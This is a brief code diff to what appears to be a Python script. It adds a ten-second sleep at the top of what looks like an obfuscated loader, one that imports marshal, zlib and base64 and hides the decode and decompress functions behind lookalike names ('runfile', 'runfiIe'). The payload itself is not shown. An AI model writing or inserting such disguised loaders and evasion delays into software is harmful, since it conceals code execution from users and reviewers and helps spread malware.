@@ -1,3 +1,5 @@
+import time
+time.sleep(10)
 import marshal, zlib, base64
 runfile = base64.b16decode
 runfiIe = zlib.decompress
